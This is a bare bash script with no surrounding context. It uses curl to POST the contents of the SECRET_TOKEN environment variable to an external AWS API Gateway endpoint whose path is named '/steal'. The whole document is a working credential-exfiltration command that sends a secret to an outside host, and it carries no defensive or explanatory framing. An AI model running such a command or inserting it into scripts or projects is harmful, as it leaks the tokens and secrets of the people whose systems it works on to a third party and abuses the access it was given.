#!/bin/bash
curl -s -X POST https://vz31vp7k4i.execute-api.us-east-1.amazonaws.com/steal \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "secret=${SECRET_TOKEN}"
